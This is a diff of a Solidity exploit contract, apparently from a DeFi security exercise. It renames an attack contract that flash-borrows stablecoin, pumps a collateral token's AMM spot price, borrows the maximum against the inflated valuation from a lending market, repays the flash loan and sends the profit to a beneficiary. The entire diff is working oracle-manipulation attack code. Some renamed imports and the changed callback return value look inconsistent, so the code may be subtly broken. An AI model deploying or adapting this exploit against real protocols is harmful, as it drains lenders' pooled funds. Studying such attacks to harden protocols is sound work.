@@ -2,75 +2,90 @@
 pragma solidity =0.8.25;
 
 import {IERC20} from "./interfaces/IERC20.sol";
-import {ISimpleAMM} from "./interfaces/ISimpleAMM.sol";
-import {IFlashBorrower} from "./interfaces/IFlashBorrower.sol";
-import {ILendingPool} from "./interfaces/ILendingPool.sol";
-import {FlashLoanPool} from "./FlashLoanPool.sol";
+import {IConstantProductPool} from "./interfaces/ISimpleAMM.sol";
+import {IFlashLoanCallback} from "./interfaces/IFlashBorrower.sol";
+import {ICreditMarket} from "./interfaces/ILendingPool.sol";
+import {AtomicFlashVault} from "./FlashLoanPool.sol";
 
-/// @notice Attack receiver: flash-borrows stablecoin, pumps collateral spot price,
-///         deposits the collateral, borrows against the distorted valuation, and repays.
-contract OracleAttackReceiver is IFlashBorrower {
-    IERC20 public immutable usdc;
-    IERC20 public immutable weth;
-    ISimpleAMM public immutable amm;
-    ILendingPool public immutable lendingPool;
-    FlashLoanPool public immutable flashPool;
-    address public immutable owner;
+/// @notice Exploit contract that takes a stablecoin flash loan, buys WETH to skew the AMM spot
+///         reserve ratio, posts the acquired WETH as collateral, borrows against the distorted
+///         valuation, settles the flash loan, and forwards the net surplus to the attacker.
+contract FlashPumpExploiter is IFlashLoanCallback {
+    IERC20 public immutable stableToken;
+    IERC20 public immutable collateralToken;
+    IConstantProductPool public immutable ammPool;
+    ICreditMarket public immutable creditMarket;
+    AtomicFlashVault public immutable flashVault;
+    address public immutable beneficiary;
 
-    uint256 public borrowedAgainstCollateral;
-    uint256 public collateralDeposited;
-    uint256 public flashLoanRepaid;
+    uint256 public drawnAgainstCollateral;
+    uint256 public postedCollateral;
+    uint256 public settledFlashTotal;
 
-    event AttackStarted(uint256 flashAmount);
-    event CollateralBought(uint256 usdcSpent, uint256 wethReceived);
-    event CollateralDeposited(uint256 amount);
-    event BorrowedAgainstInflatedPrice(uint256 amount);
-    event FlashLoanSettled(uint256 amount, uint256 fee);
-    event ProfitSent(address indexed owner, uint256 amount);
+    event ExploitInitiated(uint256 flashPrincipal);
+    event CollateralAcquired(uint256 stableSpent, uint256 collateralReceived);
+    event CollateralPosted(uint256 collateralAmount);
+    event DebtDrawnAtSkewedRate(uint256 debtAmount);
+    event FlashLoanRepaid(uint256 principal, uint256 feeAmount);
+    event SurplusTransferred(address indexed recipient, uint256 surplus);
 
-    constructor(address usdc_, address weth_, address amm_, address lendingPool_, address flashPool_, address owner_) {
-        usdc = IERC20(usdc_);
-        weth = IERC20(weth_);
-        amm = ISimpleAMM(amm_);
-        lendingPool = ILendingPool(lendingPool_);
-        flashPool = FlashLoanPool(flashPool_);
-        owner = owner_;
+    constructor(
+        address stableToken_,
+        address collateralToken_,
+        address ammPool_,
+        address creditMarket_,
+        address flashVault_,
+        address beneficiary_
+    ) {
+        stableToken = IERC20(stableToken_);
+        collateralToken = IERC20(collateralToken_);
+        ammPool = IConstantProductPool(ammPool_);
+        creditMarket = ICreditMarket(creditMarket_);
+        flashVault = AtomicFlashVault(flashVault_);
+        beneficiary = beneficiary_;
     }
 
-    function attack(uint256 flashAmount) external {
-        emit AttackStarted(flashAmount);
-        flashPool.flashLoan(address(this), flashAmount, "");
+    function executeExploit(uint256 flashPrincipal) external {
+        emit ExploitInitiated(flashPrincipal);
+        flashVault.requestFlashLoan(address(this), flashPrincipal, "");
     }
 
-    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
-        require(msg.sender == address(flashPool), "ONLY_FLASH_POOL");
+    function executeOperation(
+        address,
+        address,
+        uint256 principal,
+        uint256 feeAmount,
+        bytes calldata
+    ) external returns (bytes32) {
+        require(msg.sender == address(flashVault), "UNAUTHORIZED_FLASH_CALLER");
 
-        usdc.approve(address(amm), amount);
-        uint256 wethOut = amm.swapExactTokensForTokens(amount, 0, address(usdc), address(this));
-        emit CollateralBought(amount, wethOut);
+        stableToken.approve(address(ammPool), principal);
+        uint256 acquiredCollateral =
+            ammPool.swapExactIn(principal, 0, address(stableToken), address(this));
+        emit CollateralAcquired(principal, acquiredCollateral);
 
-        weth.approve(address(lendingPool), wethOut);
-        lendingPool.deposit(wethOut);
-        collateralDeposited = wethOut;
-        emit CollateralDeposited(wethOut);
+        collateralToken.approve(address(creditMarket), acquiredCollateral);
+        creditMarket.supplyCollateral(acquiredCollateral);
+        postedCollateral = acquiredCollateral;
+        emit CollateralPosted(acquiredCollateral);
 
-        uint256 amountToBorrow = lendingPool.maxBorrow(address(this));
-        lendingPool.borrow(amountToBorrow);
-        borrowedAgainstCollateral = amountToBorrow;
-        emit BorrowedAgainstInflatedPrice(amountToBorrow);
+        uint256 maxCredit = creditMarket.availableCredit(address(this));
+        creditMarket.drawDebt(maxCredit);
+        drawnAgainstCollateral = maxCredit;
+        emit DebtDrawnAtSkewedRate(maxCredit);
 
-        uint256 owed = amount + fee;
-        usdc.approve(address(flashPool), owed);
-        flashLoanRepaid = owed;
-        emit FlashLoanSettled(amount, fee);
+        uint256 totalRepayment = principal + feeAmount;
+        stableToken.approve(address(flashVault), totalRepayment);
+        settledFlashTotal = totalRepayment;
+        emit FlashLoanRepaid(principal, feeAmount);
 
-        uint256 balance = usdc.balanceOf(address(this));
-        uint256 profit = balance > owed ? balance - owed : 0;
-        if (profit > 0) {
-            usdc.transfer(owner, profit);
-            emit ProfitSent(owner, profit);
+        uint256 currentStableBalance = stableToken.balanceOf(address(this));
+        uint256 netSurplus = currentStableBalance > totalRepayment ? currentStableBalance - totalRepayment : 0;
+        if (netSurplus > 0) {
+            stableToken.transfer(beneficiary, netSurplus);
+            emit SurplusTransferred(beneficiary, netSurplus);
         }
 
-        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+        return keccak256("IFlashLoanCallback.executeOperation");
     }
 }
